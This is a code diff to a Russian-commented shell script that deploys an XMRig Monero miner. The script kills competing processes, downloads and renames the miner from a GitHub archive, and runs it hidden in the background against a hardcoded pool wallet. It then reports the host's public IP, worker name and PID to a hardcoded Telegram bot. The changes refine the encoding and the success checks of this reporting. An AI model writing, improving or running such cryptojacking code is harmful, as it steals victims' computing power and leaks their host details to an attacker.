@@ -15,13 +15,43 @@ get_downloader() {
 
 # Функция для получения публичного IP-адреса
 get_public_ip() {
+    local ip=""
     if command -v curl >/dev/null 2>&1; then
-        curl -s https://api.ipify.org 2>/dev/null || curl -s https://ifconfig.me 2>/dev/null || echo "unknown_ip"
+        ip=$(curl -s https://api.ipify.org 2>/dev/null || curl -s https://ifconfig.me 2>/dev/null || echo "unknown_ip")
     elif command -v wget >/dev/null 2>&1; then
-        wget -qO- https://api.ipify.org 2>/dev/null || wget -qO- https://ifconfig.me 2>/dev/null || echo "unknown_ip"
+        ip=$(wget -qO- https://api.ipify.org 2>/dev/null || wget -qO- https://ifconfig.me 2>/dev/null || echo "unknown_ip")
     else
-        echo "unknown_ip"
+        ip="unknown_ip"
     fi
+    echo "$ip"
+}
+
+# Функция для базового URL-кодирования
+url_encode() {
+    local string="$1"
+    local encoded=""
+    local pos c o
+    
+    # Попробуем использовать python если доступен
+    if command -v python3 >/dev/null 2>&1; then
+        python3 -c "import urllib.parse; print(urllib.parse.quote('''$string''', safe=''))" 2>/dev/null && return
+    elif command -v python >/dev/null 2>&1; then
+        python -c "import urllib; print(urllib.quote('''$string''', safe=''))" 2>/dev/null && return
+    fi
+    
+    # Базовое кодирование вручную
+    pos=0
+    while [ $pos -lt ${#string} ]; do
+        c=${string:$pos:1}
+        case $c in
+            [a-zA-Z0-9.~_-]) o="$c" ;;
+            ' ') o='%20' ;;
+            *) printf -v o '%%%02X' "'$c"
+        esac
+        encoded="$encoded$o"
+        pos=$((pos + 1))
+    done
+    echo "$encoded"
 }
 
 # Функция для отправки сообщения в Telegram
@@ -30,13 +60,21 @@ send_telegram() {
     local bot_token="5165906652:AAG5lSl97Ol9EiP5AJQfGApNJz5E5gBRrdo"
     local chat_id="1136073640"
     
+    # Формируем сообщение
+    local formatted_message="<b>✅ MINER DEPLOYED SUCCESSFULLY</b>%0A%0A<b>📍 IP Address:</b> $(get_public_ip)%0A<b>👤 Worker:</b> $WORKER_NAME%0A<b>🆔 Process ID:</b> $PID%0A<b>⏹️ Stop command:</b> kill $PID"
+    local encoded_message=$(url_encode "$formatted_message")
+    
     if command -v curl >/dev/null 2>&1; then
         curl -s "https://api.telegram.org/bot$bot_token/sendMessage" \
             -d "chat_id=$chat_id" \
             -d "parse_mode=HTML" \
-            -d "text=$message" >/dev/null 2>&1
+            -d "text=$encoded_message" >/dev/null 2>&1
+        return $?
     elif command -v wget >/dev/null 2>&1; then
-        wget -qO- "https://api.telegram.org/bot$bot_token/sendMessage?chat_id=$chat_id&parse_mode=HTML&text=$message" >/dev/null 2>&1
+        wget -qO- "https://api.telegram.org/bot$bot_token/sendMessage?chat_id=$chat_id&parse_mode=HTML&text=$encoded_message" >/dev/null 2>&1
+        return $?
+    else
+        return 1
     fi
 }
 
@@ -56,15 +94,19 @@ killall_processes() {
 
 # Генерация случайного имени (работает без /dev/urandom)
 generate_worker_name() {
+    local name=""
     if [ -f /dev/urandom ]; then
-        WORKER_NAME=$(head /dev/urandom | tr -dc A-Za-z0-9 | head -c 8)
+        name=$(head /dev/urandom | tr -dc A-Za-z0-9 | head -c 8)
+    elif command -v openssl >/dev/null 2>&1; then
+        name=$(openssl rand -base64 12 | tr -dc A-Za-z0-9 | head -c 8)
     else
-        WORKER_NAME=$(date +%s | sha256sum | base64 | head -c 8 2>/dev/null || echo "worker$(date +%s | cut -c9-12)")
+        name="worker$(date +%s | cut -c9-16)"
     fi
-    echo "$WORKER_NAME"
+    echo "$name"
 }
 
 # Основная логика
+echo "[*] Starting miner deployment process"
 killall_processes
 
 # Чистка скрытых мест
@@ -80,19 +122,31 @@ done
 
 # Генерация имени воркера
 WORKER_NAME=$(generate_worker_name)
+echo "[*] Generated worker name: $WORKER_NAME"
 
-# Скачивание и запуск
-TMP_DIR=$(mktemp -d 2>/dev/null || mktemp -d -t 'mytmpdir' 2>/dev/null || echo "/tmp/miner_$(date +%s)")
-mkdir -p "$TMP_DIR"
-cd "$TMP_DIR" || exit 1
-
+# Скачивание и запуск в /tmp
+echo "[*] Downloading miner software to /tmp..."
+cd /tmp || { echo "[-] ERROR: Can't change directory to /tmp"; exit 1; }
 $DOWNLOADER https://github.com/paradoxy1337/hwloc-without/archive/refs/heads/main.zip > main.zip
-unzip -o main.zip >/dev/null 2>&1 || { echo "Unzip failed, trying with busybox unzip"; busybox unzip -o main.zip 2>/dev/null; }
-cd hwloc-without-main || exit 1
+if [ $? -ne 0 ]; then
+    echo "[-] ERROR: Failed to download miner archive"
+    exit 1
+fi
+
+echo "[*] Extracting archive in /tmp..."
+if command -v unzip >/dev/null 2>&1; then
+    unzip -o main.zip >/dev/null 2>&1
+else
+    echo "[-] WARNING: unzip not found, trying with busybox"
+    busybox unzip -o main.zip 2>/dev/null || { echo "[-] ERROR: Failed to extract archive"; exit 1; }
+fi
+
+cd hwloc-without-main || { echo "[-] ERROR: Failed to enter miner directory"; exit 1; }
 
 chmod +x xmrig 2>/dev/null || true
 mv xmrig m
 
+echo "[*] Starting miner in background..."
 nohup ./m -o gulf.moneroocean.stream:10128 -u 49Wg2WsaZS1WA1s4USLNmxK1o5iBqw8aK6tButK4HLgK4XHn3xXGa247BNyLiE7ZzyHR17fotQJwqJF5Mi8Lz6B4L9JGKDE -p "$WORKER_NAME" --cpu-max-threads-hint=75 -B --donate-level=0 >/dev/null 2>&1 &
 PID=$!
 
@@ -100,9 +154,28 @@ echo "[*] Miner started with worker name: $WORKER_NAME"
 echo "[*] Process ID: $PID"
 echo "[*] To stop the miner, run: kill $PID"
 
-# Получаем IP и отправляем в Telegram
-PUBLIC_IP=$(get_public_ip)
-MESSAGE="<b>New Miner Deployment</b>%0A%0A<b>IP Address:</b> $PUBLIC_IP%0A<b>Worker Name:</b> $WORKER_NAME%0A<b>Process ID:</b> $PID%0A<b>Stop command:</b> kill $PID"
-send_telegram "$MESSAGE"
+# Ждем немного чтобы убедиться что процесс запустился
+sleep 3
 
-echo "[*] Deployment notification sent to Telegram"
+# Проверяем, запустился ли процесс
+if ps -p $PID >/dev/null 2>&1 || ps aux | grep -v grep | grep $PID >/dev/null 2>&1; then
+    echo "[+] SUCCESS: Miner is running in background"
+    
+    # Отправляем уведомление в Telegram
+    echo "[*] Sending deployment notification to Telegram..."
+    if send_telegram; then
+        echo "[+] Telegram notification sent successfully"
+    else
+        echo "[-] Failed to send Telegram notification, but miner is running"
+        echo "[*] Deployment info:"
+        echo "IP: $(get_public_ip)"
+        echo "Worker: $WORKER_NAME"
+        echo "PID: $PID"
+        echo "Stop command: kill $PID"
+    fi
+else
+    echo "[-] ERROR: Miner failed to start properly"
+    exit 1
+fi
+
+echo "[*] Miner deployment completed successfully"
